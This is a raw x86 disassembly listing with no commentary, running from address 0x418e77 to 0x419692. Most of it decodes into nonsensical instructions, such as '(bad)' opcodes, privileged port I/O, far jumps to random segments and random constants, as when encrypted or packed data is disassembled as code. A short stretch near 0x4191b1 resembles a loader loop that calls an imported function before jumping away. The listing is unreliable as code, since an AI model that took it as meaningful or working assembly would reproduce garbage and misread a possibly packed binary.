  418e77:	fwait
  418e78:	or     BYTE PTR [ebp-0x4f],dl
  418e7b:	ja     0x418eb0
  418e7d:	es cmp ebp,ecx
  418e80:	mov    eax,edi
  418e82:	int    0xa5
  418e84:	popf   
  418e85:	and    BYTE PTR ds:0x18db5813,cl
  418e8b:	dec    esi
  418e8c:	jle    0x418ed3
  418e8e:	fs int3 
  418e90:	push   edi
  418e91:	cmp    eax,0xc6da85f6
  418e96:	mov    al,BYTE PTR [edi-0x48]
  418e99:	div    DWORD PTR [ecx+0x0]
  418e9c:	sbb    DWORD PTR cs:[edx],edx
  418e9f:	or     ebp,esp
  418ea1:	data16 mul BYTE PTR [eax+0x7c]
  418ea5:	scas   eax,DWORD PTR es:[edi]
  418ea6:	mov    edi,0xc7df260b
  418eab:	out    0x87,al
  418ead:	cmp    DWORD PTR [edx+0x63c21090],edx
  418eb3:	lea    esi,[esi+0x79]
  418eb6:	xchg   ebp,eax
  418eb7:	scas   al,BYTE PTR es:[edi]
  418eb8:	inc    eax
  418eb9:	mov    dl,0xb3
  418ebb:	cdq    
  418ebc:	(bad)  
  418ebd:	xchg   esi,eax
  418ebe:	cwde   
  418ebf:	jae    0x418e41
  418ec1:	push   edi
  418ec2:	inc    edx
  418ec3:	(bad)  
  418ec4:	pop    ds
  418ec5:	scas   eax,DWORD PTR es:[edi]
  418ec6:	imul   esi,DWORD PTR [ebp-0x2bb86295],0xee1f3b42
  418ed0:	jbe    0x418eaa
  418ed2:	mov    esi,edi
  418ed4:	arpl   WORD PTR [edi],ax
  418ed6:	jge    0x418eae
  418ed8:	test   bl,al
  418eda:	mov    edi,0xc5edc5b8
  418edf:	in     eax,0x2c
  418ee1:	stc    
  418ee2:	les    ebx,FWORD PTR [ecx+0x2246ee7a]
  418ee8:	lods   eax,DWORD PTR ds:[esi]
  418ee9:	push   edx
  418eea:	dec    esp
  418eeb:	mov    ds:0x3e6f852f,eax
  418ef0:	jge    0x418ec7
  418ef2:	sub    eax,edx
  418ef4:	lods   al,BYTE PTR ds:[esi]
  418ef5:	xor    BYTE PTR [eax-0x4f],dh
  418ef8:	push   edi
  418ef9:	xor    DWORD PTR [ebp+0x2703fb9f],0x9546594e
  418f03:	js     0x418f58
  418f05:	je     0x418f7e
  418f07:	pop    ebp
  418f08:	das    
  418f09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f0a:	sbb    al,0x68
  418f0c:	add    ch,BYTE PTR [ecx]
  418f0e:	xchg   ecx,eax
  418f0f:	bnd jnp 0x418f91
  418f12:	sbb    BYTE PTR [ebp+0x52a3d7e],ch
  418f18:	and    eax,0x50912ae8
  418f1d:	or     BYTE PTR [ebx],cl
  418f1f:	scas   al,BYTE PTR es:[edi]
  418f20:	rol    DWORD PTR [edi-0x5f5622c4],0xa9
  418f27:	dec    ebp
  418f28:	inc    ebp
  418f29:	inc    esi
  418f2a:	aam    0xd4
  418f2c:	sbb    ebp,ecx
  418f2e:	mov    cl,0xff
  418f30:	or     DWORD PTR [eax+0x4a],esi
  418f33:	stos   BYTE PTR es:[edi],al
  418f34:	jmp    0x2702:0x30c0605
  418f3b:	stos   BYTE PTR es:[edi],al
  418f3c:	jno    0x418f04
  418f3e:	div    BYTE PTR [ecx]
  418f40:	iret   
  418f41:	call   0x57303cc9
  418f46:	fcmovnb st,st(3)
  418f48:	cmc    
  418f49:	leave  
  418f4a:	mov    ds:0x8dca9ebb,eax
  418f4f:	mov    ch,0x4b
  418f51:	adc    eax,0x24bf7403
  418f56:	loop   0x418ef8
  418f58:	fidiv  WORD PTR [edx+eax*2+0x193f2804]
  418f5f:	adc    DWORD PTR [ebx+0xa],eax
  418f62:	cmp    cl,cl
  418f64:	sbb    DWORD PTR [esi+eax*4-0x1],0xd
  418f69:	daa    
  418f6a:	dec    ebp
  418f6b:	xchg   esp,eax
  418f6c:	xchg   DWORD PTR [edi+ebx*8],esi
  418f6f:	fwait
  418f70:	call   DWORD PTR [esi-0x2b2ed5ab]
  418f76:	dec    ebp
  418f77:	fistp  QWORD PTR [esi]
  418f79:	jne    0x418fc1
  418f7b:	mov    dl,0xcb
  418f7d:	(bad)  
  418f7e:	lods   al,BYTE PTR ds:[esi]
  418f7f:	sbb    bh,0x7b
  418f82:	dec    edi
  418f83:	push   0xffffffd6
  418f85:	pusha  
  418f86:	xchg   ecx,eax
  418f87:	lock inc esi
  418f89:	mov    ch,0x73
  418f8b:	enter  0x238,0xff
  418f8f:	dec    ebp
  418f90:	or     edx,DWORD PTR [esi-0x29af5a51]
  418f96:	adc    al,0x7
  418f98:	and    bl,BYTE PTR [ebp-0x4e]
  418f9b:	xchg   ecx,eax
  418f9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f9d:	jle    0x77606c07
  418fa3:	cmc    
  418fa4:	push   ebx
  418fa5:	pop    ds
  418fa6:	push   edi
  418fa7:	adc    DWORD PTR [eax-0x1b],eax
  418faa:	in     al,dx
  418fab:	jle    0x419001
  418fad:	sti    
  418fae:	retf   
  418faf:	in     eax,0x7
  418fb1:	adc    BYTE PTR [edx+0x7e677449],dl
  418fb7:	cdq    
  418fb8:	cwde   
  418fb9:	pop    ebp
  418fba:	js     0x418fae
  418fbc:	pop    edi
  418fbd:	push   esi
  418fbe:	lahf   
  418fbf:	push   edx
  418fc0:	adc    eax,DWORD PTR [edi-0x4d0841bf]
  418fc6:	imul   edi,esp,0xffffffef
  418fc9:	jbe    0x418f8a
  418fcb:	aam    0xe0
  418fcd:	shl    DWORD PTR [ebx-0x72],1
  418fd0:	xor    BYTE PTR [ecx],bl
  418fd2:	aaa    
  418fd3:	(bad)
  418fd7:	xchg   ebx,eax
  418fd8:	popf   
  418fd9:	cld    
  418fda:	lods   al,BYTE PTR ds:[esi]
  418fdb:	and    eax,0xc9d6eafb
  418fe0:	mov    esp,0x47b5af10
  418fe5:	dec    edi
  418fe6:	or     DWORD PTR [ebx+eax*2],ecx
  418fe9:	jnp    0x418fa6
  418feb:	rcr    DWORD PTR [eax+0x24],0x63
  418fef:	adc    DWORD PTR [esi],esi
  418ff1:	push   edx
  418ff2:	cmp    eax,0x2407649d
  418ff7:	adc    al,0x56
  418ff9:	cmp    eax,0x932286a2
  418ffe:	in     al,0x54
  419000:	dec    esp
  419001:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419002:	les    esp,FWORD PTR [eiz*2+0xc39412e]
  419009:	xchg   esi,eax
  41900a:	sbb    BYTE PTR [edx-0x4ac49eec],dl
  419010:	outs   dx,DWORD PTR ds:[esi]
  419011:	fdiv   QWORD PTR [ebx]
  419013:	xchg   edx,eax
  419014:	dec    BYTE PTR [eax-0x317f1480]
  41901a:	mov    bl,0xff
  41901c:	dec    ecx
  41901d:	repz or BYTE PTR [ebx+0x2e2a9cd5],dh
  419024:	shr    eax,1
  419026:	and    bh,0xc8
  419029:	cmp    DWORD PTR [edi],esp
  41902b:	aam    0xa3
  41902d:	test   BYTE PTR [esi-0x328ba8d6],dl
  419033:	or     al,0x80
  419035:	nop
  419036:	push   ss
  419037:	out    0x47,eax
  419039:	jae    0x419094
  41903b:	pop    eax
  41903c:	jo     0x41909c
  41903e:	(bad)  
  41903f:	shl    DWORD PTR [edi],1
  419041:	out    dx,eax
  419042:	xchg   ebp,eax
  419043:	xor    DWORD PTR [edx],esi
  419045:	xor    al,bl
  419047:	fsubr  st(1),st
  419049:	mov    ebx,0xc0144154
  41904e:	jp     0x418fec
  419050:	nop
  419051:	lahf   
  419052:	imul   ecx,DWORD PTR [ecx+0x29],0xc70406
  419059:	cdq    
  41905a:	add    BYTE PTR [ebx],bh
  41905c:	jmp    0x8c6f:0xb41c5004
  419063:	mov    al,ds:0x7d6f3e92
  419068:	dec    ebx
  419069:	and    al,0xa0
  41906b:	add    esp,DWORD PTR [esi+0x1a]
  41906e:	ror    DWORD PTR [ebp+0x64814423],cl
  419074:	stos   BYTE PTR es:[edi],al
  419075:	(bad)  
  419076:	dec    esp
  419077:	inc    esp
  419078:	or     eax,0xe38131af
  41907d:	dec    ebp
  41907e:	push   cs
  41907f:	not    DWORD PTR ds:0x14c4b438
  419085:	sbb    ebx,ecx
  419087:	std    
  419088:	push   edi
  419089:	mov    DWORD PTR [ecx+0x4fd97e68],ecx
  41908f:	stos   BYTE PTR es:[edi],al
  419090:	xchg   esp,eax
  419091:	icebp  
  419092:	cdq    
  419093:	dec    esp
  419094:	push   0x314b4831
  419099:	and    esp,esp
  41909b:	ds jmp 0xfafa:0x198a13df
  4190a3:	cmc    
  4190a4:	and    edx,edi
  4190a6:	je     0x41903f
  4190a8:	sbb    bl,cl
  4190aa:	arpl   WORD PTR [eax+0x66e7f500],bx
  4190b0:	xlat   BYTE PTR ds:[ebx]
  4190b1:	mov    bh,0x7a
  4190b3:	sar    BYTE PTR [ecx],cl
  4190b5:	(bad)  
  4190b6:	cmp    DWORD PTR [ebx-0x48],esi
  4190b9:	push   es
  4190ba:	and    al,0xf3
  4190bc:	push   eax
  4190bd:	xor    bl,BYTE PTR [edi+edi*2]
  4190c0:	mov    al,0x1f
  4190c2:	or     dh,BYTE PTR [ebp-0x76c6a31f]
  4190c8:	ret    0x356e
  4190cb:	out    0x4c,al
  4190cd:	adc    BYTE PTR [esi-0x5d],cl
  4190d0:	or     eax,0xfa4528f9
  4190d5:	dec    esp
  4190d6:	out    dx,al
  4190d7:	pop    ecx
  4190d8:	pushf  
  4190d9:	push   0xea7a57ab
  4190de:	inc    edx
  4190df:	pop    ebx
  4190e0:	dec    edi
  4190e1:	or     eax,0x96000836
  4190e6:	(bad)  
  4190e7:	sub    ebx,esp
  4190e9:	out    0xf1,eax
  4190eb:	push   ss
  4190ec:	sub    BYTE PTR [eax+0x4],ah
  4190ef:	shl    DWORD PTR [ebp-0x15],cl
  4190f2:	aaa    
  4190f3:	mul    BYTE PTR [eax]
  4190f5:	adc    ch,BYTE PTR [ecx]
  4190f7:	push   ecx
  4190f8:	jno    0x41914f
  4190fa:	inc    ebx
  4190fb:	fwait
  4190fc:	push   ecx
  4190fd:	sbb    eax,0xec1ffd3d
  419102:	icebp  
  419103:	inc    eax
  419104:	arpl   WORD PTR [esi+0xcbabaca],di
  41910a:	inc    ecx
  41910b:	cli    
  41910c:	push   es
  41910d:	vpunpckhwd ymm2,ymm3,YMMWORD PTR [esi-0x3b]
  419112:	or     al,0xac
  419114:	xchg   esp,eax
  419115:	mov    bh,0xd4
  419117:	and    DWORD PTR [ecx+0x7083a8f5],0xe537e999
  419121:	jbe    0x419103
  419123:	test   DWORD PTR [ecx+0x53],esp
  419126:	in     eax,dx
  419127:	mov    dh,0x27
  419129:	cmp    DWORD PTR [ebp+0x50],0xffffff9e
  41912d:	mov    esi,0xd5c9adf4
  419132:	xchg   ecx,eax
  419133:	leave  
  419134:	mov    ebx,0x824215cd
  419139:	repz pop edi
  41913b:	sbb    bl,ch
  41913d:	je     0x419126
  41913f:	push   0xfffffffb
  419141:	cmp    al,0xe0
  419143:	cdq    
  419144:	add    ecx,DWORD PTR [bx+di]
  419147:	mov    cl,0xc4
  419149:	dec    eax
  41914a:	in     eax,dx
  41914b:	loop   0x419153
  41914d:	std    
  41914e:	xchg   esp,eax
  41914f:	lods   eax,DWORD PTR ds:[esi]
  419150:	iret   
  419151:	(bad)  
  419152:	or     edi,ecx
  419154:	push   esp
  419155:	shl    BYTE PTR [edi-0x7f54f33f],cl
  41915b:	xor    edx,edi
  41915d:	jb     0x4190f8
  41915f:	cs pop eax
  419161:	sub    bl,BYTE PTR [ecx+0x41]
  419164:	sbb    BYTE PTR [edi-0x2],dl
  419167:	mov    ebp,DWORD PTR [ecx-0x7668b2f7]
  41916d:	repz adc dl,dh
  419170:	cmc    
  419171:	push   cs
  419172:	mov    ebx,0xfde7654b
  419177:	lahf   
  419178:	bound  ebx,QWORD PTR [ecx]
  41917a:	pop    edi
  41917b:	ror    DWORD PTR es:[eax+0x2d],0xcc
  419180:	mov    dh,0x6e
  419182:	sbb    BYTE PTR ds:0x2f678354,bl
  419188:	je     0x419199
  41918a:	jg     0x4191ea
  41918c:	sub    DWORD PTR [eax+edi*8],esp
  41918f:	lods   eax,DWORD PTR ds:[esi]
  419190:	aas    
  419191:	add    eax,0xfc45c75f
  419196:	fadd   DWORD PTR [ebp+0x1581f89c]
  41919c:	jge    0x419141
  41919e:	inc    edx
  41919f:	add    dh,bh
  4191a1:	adc    DWORD PTR [eax],eax
  4191a3:	add    bh,al
  4191a5:	inc    ebp
  4191a6:	fdivr  DWORD PTR [edx]
  4191a8:	test   DWORD PTR [eax+edi*8+0x48d3df81],ebx
  4191af:	add    BYTE PTR [eax],al
  4191b1:	mov    DWORD PTR [ebp-0x2c],0xf89c853b
  4191b8:	and    DWORD PTR ds:0x42a339,0x0
  4191c2:	mov    edx,DWORD PTR ds:0x42a339
  4191c8:	inc    edx
  4191c9:	mov    DWORD PTR ds:0x42a339,edx
  4191cf:	cmp    DWORD PTR ds:0x42a339,0x1c
  4191d6:	jne    0x4191f6
  4191dc:	push   0x42a2d9
  4191e1:	push   0x39c2
  4191e6:	push   0x8f9d
  4191eb:	push   0x3fa2
  4191f0:	call   DWORD PTR ds:0x425354
  4191f6:	cmp    DWORD PTR ds:0x42a339,0x12
  4191fd:	jb     0x4191c2
  419203:	xor    edx,edx
  419205:	xor    edx,DWORD PTR ds:0x42a331
  41920b:	add    DWORD PTR ds:0x42a2e9,edx
  419211:	jmp    0x419723
  419216:	retf   
  419217:	ret    
  419218:	ds ret 
  41921a:	mov    cl,0xc9
  41921d:	retf   
  41921e:	xadd   esp,eax
  419221:	xor    BYTE PTR [edx+0x134c8bb7],ah
  419227:	out    dx,al
  419228:	jg     0x4192a2
  41922a:	jae    0x4192a8
  41922c:	js     0x4192a6
  41922e:	sbb    al,0x69
  419230:	adc    eax,0x62a1be01
  419235:	in     eax,dx
  419236:	sub    cl,BYTE PTR [eax-0x63]
  419239:	(bad)  
  41923b:	fbld   TBYTE PTR [esi+edx*2]
  41923e:	popa   
  41923f:	iret   
  419240:	jb     0x41924d
  419242:	sub    BYTE PTR [ecx+0x1c1c6b87],bl
  419248:	sar    DWORD PTR [eax+0x73],cl
  41924b:	popaw  
  41924d:	fild   QWORD PTR [ecx+0x4c]
  419250:	or     al,0xbf
  419252:	iret   
  419253:	je     0x4191df
  419255:	cli    
  419256:	mov    DWORD PTR [ebp+0x673a706b],esi
  41925c:	xchg   ebp,eax
  41925d:	into   
  41925e:	dec    ecx
  41925f:	mov    ah,0x4c
  419261:	stc    
  419262:	inc    ebx
  419263:	xor    al,0x17
  419265:	jmp    0x8d981b81
  41926a:	mov    bl,0x9f
  41926c:	sub    DWORD PTR [edx-0x6c8bd0e6],esi
  419272:	xor    DWORD PTR [ebx+edi*1],eax
  419275:	ficom  WORD PTR [edx+0x5d7b2483]
  41927b:	cmp    esi,esi
  41927d:	test   al,0x1d
  41927f:	dec    ecx
  419280:	push   esp
  419281:	pop    ebp
  419282:	fcom   QWORD PTR [ecx-0x579d401]
  419288:	push   ecx
  419289:	fnstenv [ebp-0x51]
  41928c:	mov    al,0x80
  41928e:	pop    eax
  41928f:	adc    dh,bl
  419291:	mov    edi,0x65853976
  419296:	mov    ah,0x7f
  419298:	push   cs
  419299:	out    0xd1,al
  41929b:	sbb    esp,ecx
  41929d:	nop
  41929e:	mov    bh,0xe5
  4192a0:	xor    eax,0xa985fc0a
  4192a5:	pop    eax
  4192a6:	aad    0xc4
  4192a8:	mov    dl,0x9e
  4192aa:	mov    ds:0x41927cb9,al
  4192af:	sub    ch,ch
  4192b1:	loopne 0x41924c
  4192b3:	data16 mov BYTE PTR [eax-0x2e864769],dh
  4192ba:	popa   
  4192bb:	jb     0x41927d
  4192bd:	sub    DWORD PTR [ebx+0x23],0x13
  4192c1:	leave  
  4192c2:	jae    0x4192fd
  4192c4:	cdq    
  4192c5:	mov    ebx,0xa94172d1
  4192ca:	(bad)  
  4192cb:	fdivrp st(0),st
  4192cd:	fstp   TBYTE PTR [edi-0x4d]
  4192d0:	xlat   BYTE PTR ds:[ebx]
  4192d1:	gs pop ebp
  4192d3:	jne    0x4192b5
  4192d5:	aad    0xcf
  4192d7:	add    BYTE PTR es:[ebx],al
  4192da:	mov    DWORD PTR [eax+0x5b104d7a],esp
  4192e0:	or     BYTE PTR [ebx+eiz*2+0xf],0xc5
  4192e5:	lea    esp,[ebx+0x1a52fc22]
  4192eb:	inc    edx
  4192ec:	jmp    0xe2e6482c
  4192f1:	pop    ebx
  4192f2:	test   al,0xb9
  4192f4:	test   ah,0x7d
  4192f7:	ror    DWORD PTR [esp+ebp*2+0x31],0x22
  4192fc:	push   esp
  4192fd:	dec    ebp
  4192fe:	dec    esp
  4192ff:	jmp    0x4192a7
  419301:	(bad)  
  419302:	mov    BYTE PTR [ecx+0x7cd28c95],ah
  419308:	push   0x28ac4c71
  41930d:	in     al,0xa3
  41930f:	cld    
  419310:	jno    0x419316
  419312:	fist   WORD PTR [ecx+eiz*2]
  419315:	inc    ebp
  419316:	repnz pusha 
  419318:	in     al,dx
  419319:	cmp    dl,al
  41931b:	pusha  
  41931c:	inc    ebx
  41931d:	js     0x419392
  41931f:	pop    eax
  419320:	sub    edi,DWORD PTR [ebp+0x40]
  419323:	lods   al,BYTE PTR ds:[esi]
  419324:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419325:	dec    ebp
  419326:	jmp    0xdc35d753
  41932b:	mov    eax,0x3f6ccf54
  419330:	(bad)  
  419331:	loop   0x419316
  419333:	test   BYTE PTR ds:0xee2fde8f,ah
  419339:	jmp    0xb1de:0xd2e6aa5
  419340:	mov    eax,0x6ed6e1ba
  419345:	loop   0x419325
  419347:	call   0xb386:0xcd4b52d8
  41934e:	mov    DWORD PTR [eax-0x6ceb701b],esp
  419354:	bound  edi,QWORD PTR [edx+edi*2+0x48]
  419358:	pop    edi
  419359:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41935a:	call   0x18ce:0xa5e65fdd
  419361:	arpl   WORD PTR [eax+ebx*8+0x56],di
  419365:	adc    ebx,DWORD PTR [esi+eax*4-0x10]
  419369:	push   edx
  41936a:	adc    eax,0xf83727ba
  41936f:	(bad)  [ebp-0x10]
  419372:	movbe  DWORD PTR [edx+ebp*2],eax
  419377:	mov    ?,WORD PTR [edi-0x16]
  41937a:	pop    edx
  41937b:	(bad)  
  41937c:	mov    dl,0xe3
  41937e:	call   0x39e2d6dd
  419383:	pop    ecx
  419384:	test   DWORD PTR [edx+0x3885c846],ebp
  41938a:	mov    al,0x10
  41938c:	mov    eax,ds:0x75bf94be
  419391:	mov    al,BYTE PTR [edx+0x3f9fb54c]
  419397:	and    eax,0x983cc097
  41939c:	bound  ebx,QWORD PTR [edx-0x3a]
  41939f:	clc    
  4193a0:	imul   DWORD PTR [ebx-0xa]
  4193a3:	jecxz  0x41939c
  4193a5:	mov    BYTE PTR [esi-0x502b0be2],dh
  4193ab:	sub    DWORD PTR [edx+0x8],edi
  4193ae:	or     al,0x48
  4193b0:	fmul   DWORD PTR [edx-0x14]
  4193b3:	test   eax,0xfb0f246
  4193b8:	mov    edx,0x7b4f6a85
  4193bd:	les    edi,FWORD PTR [ebx+0x3b673217]
  4193c3:	mov    ch,0xed
  4193c5:	fdiv   DWORD PTR [ebp+ebx*1+0x53]
  4193c9:	daa    
  4193ca:	in     al,0x77
  4193cc:	xchg   DWORD PTR ds:[edi],ecx
  4193cf:	or     bl,BYTE PTR [ebp+0x8]
  4193d2:	iret   
  4193d3:	aad    0x69
  4193d5:	aad    0x90
  4193d7:	mov    edi,eax
  4193d9:	adc    BYTE PTR [edi+0x36ca4a6e],dh
  4193df:	sub    ecx,0xffffffbd
  4193e2:	add    BYTE PTR [edx+0x6a4f64],al
  4193e8:	mov    esi,0x13aab2bf
  4193ed:	test   al,0x3b
  4193ef:	je     0x4193cb
  4193f1:	cdq    
  4193f2:	rol    ah,0xc8
  4193f5:	jmp    0x34cb4117
  4193fa:	mov    eax,ds:0xe0519511
  4193ff:	int3   
  419400:	xchg   esi,eax
  419401:	fbstp  TBYTE PTR [ebp-0x3739e345]
  419407:	es loopne 0x41946f
  41940a:	push   ebx
  41940b:	jl     0x4193e0
  41940d:	(bad)  
  41940e:	dec    ebp
  41940f:	outs   dx,BYTE PTR ds:[esi]
  419410:	popf   
  419411:	jp     0x4193a1
  419413:	inc    eax
  419414:	or     edi,ecx
  419416:	pop    ebx
  419417:	add    eax,DWORD PTR [esi]
  419419:	lea    esi,[eax+eax*2-0x373aeda2]
  419420:	and    eax,0xbe3a2d5d
  419425:	(bad)  
  419426:	clc    
  419427:	or     al,0xcc
  419429:	mov    edi,fs
  41942b:	mov    dl,0xc2
  41942d:	push   edi
  41942e:	fiadd  DWORD PTR [ebp+0x5280caef]
  419434:	lods   eax,DWORD PTR ds:[esi]
  419435:	stos   BYTE PTR es:[edi],al
  419436:	add    dh,BYTE PTR [esi]
  419438:	dec    ecx
  419439:	push   es
  41943a:	jmp    DWORD PTR [ebx]
  41943c:	cli    
  41943d:	retf   
  41943e:	dec    esp
  41943f:	cmp    BYTE PTR [ebp+0x74],dh
  419442:	(bad)  
  419443:	xchg   esi,eax
  419444:	in     al,dx
  419445:	pop    ebx
  419446:	cli    
  419447:	cmc    
  419448:	mov    ebp,edx
  41944a:	xchg   esp,eax
  41944b:	push   cs
  41944c:	mov    edx,?
  41944e:	cmp    al,BYTE PTR [edi+0x76]
  419451:	in     al,dx
  419452:	sahf   
  419453:	add    DWORD PTR [eax-0x45],eax
  419456:	xor    edx,eax
  419458:	mov    edx,0xb1b82c23
  41945d:	retf   
  41945e:	iret   
  41945f:	das    
  419460:	imul   edi,DWORD PTR [ecx-0x73],0xffffffc3
  419464:	leave  
  419465:	pop    ecx
  419466:	dec    ebx
  419467:	js     0x4194d2
  419469:	xchg   ebx,eax
  41946a:	sbb    al,0x79
  41946c:	sub    al,0x3b
  41946e:	push   ebx
  41946f:	stc    
  419470:	lahf   
  419471:	js     0x41942b
  419473:	sti    
  419474:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419475:	shr    DWORD PTR [esi],cl
  419477:	pop    es
  419478:	push   DWORD PTR [edx+ecx*2+0x6dc0f72f]
  41947f:	fidiv  WORD PTR [eax+0x2ada8f4d]
  419485:	xchg   dh,dh
  419487:	fwait
  419488:	jmp    0xd20128e9
  41948d:	inc    ebp
  41948e:	call   0xa0c5:0x85853427
  419495:	pop    ss
  419496:	xchg   BYTE PTR [eax],dl
  419498:	pop    ecx
  419499:	mov    esi,0xca353ba5
  41949e:	xchg   esp,eax
  41949f:	popa   
  4194a0:	call   eax
  4194a2:	mov    dl,0x46
  4194a4:	jl     0x419467
  4194a6:	(bad)  
  4194a7:	aam    0xff
  4194a9:	pushf  
  4194aa:	scas   al,BYTE PTR es:[edi]
  4194ab:	div    DWORD PTR [eax+0x7c0a9e38]
  4194b1:	test   BYTE PTR [ecx+0x1d],0x5f
  4194b5:	push   0xffffffcf
  4194b7:	xchg   esi,eax
  4194b8:	mov    ds:0x87dc9c38,al
  4194bd:	jnp    0x4194e1
  4194bf:	mov    edi,0xbe356072
  4194c4:	lea    edx,[ecx]
  4194c6:	push   edx
  4194c7:	scas   eax,DWORD PTR es:[edi]
  4194c8:	cld    
  4194c9:	xchg   ebx,eax
  4194ca:	adc    edi,DWORD PTR [esi+0xa]
  4194cd:	push   esp
  4194ce:	mov    dh,0x13
  4194d0:	mov    esi,0x68524f12
  4194d5:	xor    ch,ch
  4194d7:	outs   dx,DWORD PTR ds:[esi]
  4194d8:	add    BYTE PTR [edi-0x16b8478],ch
  4194de:	jbe    0x4194da
  4194e0:	dec    ebx
  4194e1:	cmp    eax,0x16c8fa0a
  4194e6:	mov    ch,0x1c
  4194e8:	jge    0x41953b
  4194ea:	lods   al,BYTE PTR ds:[esi]
  4194eb:	das    
  4194ec:	inc    esi
  4194ed:	mov    cl,0x16
  4194ef:	mov    cs:0x91a4527c,al
  4194f5:	dec    ecx
  4194f6:	mov    bh,0xbc
  4194f8:	loopne 0x4194ff
  4194fa:	rcl    DWORD PTR [edi+0x7a717afb],0x33
  419501:	jns    0x419552
  419503:	jbe    0x419507
  419505:	jmp    0x3745:0xeb6acfe8
  41950c:	jmp    0xee18:0x14c27e66
  419513:	add    dh,BYTE PTR [edi-0x4ad1d132]
  419519:	loopne 0x419577
  41951b:	cld    
  41951c:	add    eax,0x7c84c261
  419521:	js     0x4194ec
  419523:	dec    esp
  419524:	or     edx,DWORD PTR [esi]
  419526:	rcr    ebp,0xca
  419529:	dec    ebx
  41952a:	sti    
  41952b:	mov    edx,0x478c6000
  419530:	xchg   DWORD PTR [eax+esi*4-0x44e30bfe],edi
  419537:	cs stc 
  419539:	jo     0x419587
  41953b:	cmp    ch,BYTE PTR [edi+ecx*8+0x2849b21c]
  419542:	xor    BYTE PTR [ebp+0x47],ch
  419545:	adc    BYTE PTR [esi-0x68],dh
  419548:	jns    0x419505
  41954a:	es loop 0x4195c2
  41954d:	sbb    eax,0x80a4c03f
  419552:	lods   eax,DWORD PTR ds:[esi]
  419553:	outs   dx,DWORD PTR ds:[esi]
  419554:	js     0x419502
  419556:	jne    0x4194de
  419558:	mov    ah,0xcd
  41955a:	jne    0x419572
  41955c:	add    eax,0x5533ad92
  419561:	mov    ch,0xda
  419563:	mov    BYTE PTR [ecx],cl
  419565:	inc    ebp
  419566:	test   DWORD PTR [edx-0x65],eax
  419569:	(bad)  
  41956b:	les    esp,FWORD PTR [edx]
  41956d:	mov    BYTE PTR [eax-0x53],bl
  419570:	aaa    
  419571:	ja     0x4195c6
  419573:	das    
  419574:	shr    BYTE PTR ds:0x22d9ea99,1
  41957a:	pop    ss
  41957b:	mov    ebp,0x220af435
  419580:	add    dh,BYTE PTR [eax]
  419582:	dec    edx
  419583:	push   esi
  419584:	pushf  
  419585:	repnz pop eax
  419587:	into   
  419588:	sub    bl,BYTE PTR [ecx+0x61408dc4]
  41958e:	adc    al,0xe9
  419590:	jo     0x419515
  419592:	jmp    0x368d:0xbbddd66e
  419599:	inc    edx
  41959a:	or     bh,bl
  41959c:	(bad)
  41959f:	push   esp
  4195a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195a1:	out    0x57,al
  4195a3:	push   ss
  4195a4:	inc    ebx
  4195a5:	jle    0x419587
  4195a7:	retf   0x49a4
  4195aa:	iret   
  4195ab:	sbb    cl,bh
  4195ad:	js     0x419625
  4195af:	and    ecx,DWORD PTR ds:0xa715956e
  4195b5:	dec    ebx
  4195b6:	xchg   edi,eax
  4195b7:	stos   BYTE PTR es:[edi],al
  4195b8:	mov    ds:0xed7fc744,eax
  4195bd:	mov    WORD PTR [edi],ds
  4195bf:	cmp    bl,BYTE PTR [edx+0x36c65a9d]
  4195c5:	sti    
  4195c6:	sti    
  4195c7:	mov    ecx,0xc30e6dd0
  4195cc:	cmc    
  4195cd:	repnz (bad) 
  4195cf:	jbe    0x4195c1
  4195d1:	sub    al,0x60
  4195d3:	gs inc ebx
  4195d5:	(bad)  
  4195d6:	mov    esi,0xed84a6d6
  4195db:	enter  0xa75a,0xdf
  4195df:	add    eax,0x7f7d79b0
  4195e4:	sbb    eax,0xe492585c
  4195e9:	pop    ebp
  4195ea:	push   eax
  4195eb:	jo     0x41956d
  4195ed:	and    DWORD PTR [eax],ebp
  4195ef:	add    al,0xea
  4195f1:	mov    bh,0xb8
  4195f3:	mov    ch,0xda
  4195f5:	xchg   esp,eax
  4195f6:	xchg   DWORD PTR [ecx-0x39],ebp
  4195f9:	inc    DWORD PTR [ecx-0x38ff6a12]
  4195ff:	jmp    0x41ad0142
  419604:	mov    WORD PTR [ecx],ds
  419606:	ds cli 
  419608:	sub    DWORD PTR [ebx],0x55
  41960b:	test   bh,al
  41960d:	inc    esi
  41960e:	(bad)  
  41960f:	lock (bad) 
  419611:	int3   
  419612:	js     0x4195f4
  419614:	aam    0xe1
  419616:	xor    dh,BYTE PTR [ebp-0x51]
  419619:	out    dx,eax
  41961a:	pop    ds
  41961b:	jmp    0x20991366
  419620:	or     BYTE PTR [ebp-0x3d],ah
  419623:	test   eax,0x576620c8
  419628:	xor    eax,0x8eebe60b
  41962d:	push   edi
  41962e:	cli    
  41962f:	cmp    bh,bh
  419631:	jmp    0x9798:0xbbe8aa9d
  419638:	adc    dh,BYTE PTR [edx+ebx*2+0xb]
  41963c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41963d:	retf   
  41963e:	arpl   WORD PTR [eax-0x596e5f06],bx
  419644:	xor    BYTE PTR [esi-0x4],al
  419647:	ret    0x6069
  41964a:	mov    al,0xa4
  41964c:	mov    ecx,ecx
  41964e:	mov    dh,0x66
  419650:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419651:	push   edx
  419652:	es loope 0x419642
  419655:	das    
  419656:	push   cs
  419657:	adc    DWORD PTR ds:[esi-0x56781073],ebp
  41965e:	iret   
  41965f:	pushf  
  419660:	stos   DWORD PTR es:[edi],eax
  419661:	ret    
  419662:	fimul  DWORD PTR [edx+0x76e1e234]
  419668:	mov    al,0xb0
  41966a:	mul    DWORD PTR ds:[ebp+ebx*8+0x6fd8e4e7]
  419672:	cmp    eax,0x560e5305
  419677:	cmp    BYTE PTR [ebp-0x75],dl
  41967a:	(bad)  
  41967b:	xor    DWORD PTR [edx-0x7fba2111],0x61b2fc40
  419685:	sub    al,al
  419687:	in     eax,0x41
  419689:	sar    BYTE PTR [edi+0x34d394d6],cl
  41968f:	outs   dx,DWORD PTR ds:[esi]
  419690:	adc    esp,DWORD PTR [edi]
  419692:	pop    esp
